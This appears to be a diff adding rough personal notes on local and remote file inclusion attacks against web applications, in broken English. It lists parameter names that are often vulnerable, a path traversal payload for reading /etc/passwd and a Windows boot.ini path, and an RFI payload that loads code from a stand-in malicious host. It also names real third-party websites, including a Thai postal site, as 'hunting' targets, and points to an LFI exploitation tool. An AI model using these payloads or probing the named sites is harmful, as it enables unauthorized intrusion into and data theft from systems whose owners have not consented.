@@ -1,0 +1,101 @@
+Imapct of File inclusion 
+
+a.code execution on server 
+
+b.code execution client side 
+
+c.dos attack 
+
+d.information disclosure 
+#=============================================================================================================
+1.Local file inclusion 
+
+anyparameter=somelocalfile 
+
+example 
+
+any.com/index.php?referee=login.php
+
+
+2.Remote File Inclusion 
+
+anyparmeter=remoteweb.com/file 
+
+example: 
+
+any.com/?share=http://facebook.com/status?id=12672
+#==============================================================================================================
+file, document, folder, root, path, pg, style, pdf, template, php_path, doc
+
+dest, redirest, url, path, continue, url, window, next, data, reference, site, html, val, validate, domain,
+callback, return, page, feed, host, port, to ,out, view, dir, show, navigation, open
+
+#==============================================================================================================
+--------------------------------------------
+
+LFI Vs RFI 
+
+
+
+if target web server is reside on linux pltform 
+
+server path will be /var/www/html/trump.jpeg 
+
+
+any.com/index.php?file=trump.jpeg
+
+
+system configuration file by going root directory (/.bashrc)
+
+/etc/passwd
+any.com/index.php?file=../../../etc/passwd
+
+
+Remote file inclusion 
+
+any.com/index.php?file=http://remoteweb.com/trump.jpg 
+
+any.com/index.php?file=http://malacious.com/malacious.php
+
+what if target we server will be windows based then  
+
+C:\boot.ini 
+
+../../C:\boot.ini
+
+
+-----------------------------------------
+
+LFI Hunting 
+
+target - 
+testphp.vulnweb.com
+
+kanchanapisek.or.th
+
+http://www.thailandpost.co.th
+
+----------------------------------------
+
+Exploitation of LFI 
+
+need 2 things
+1.python 2.7
+2.lfi suite
+github ---->  D35m0nd142/LFISuite
+-----------------------------------------
+
+RFI 
+
+find any parameter that will able to load content of any remote websites
+
+
+
+
+
+
+
+
+
+
+
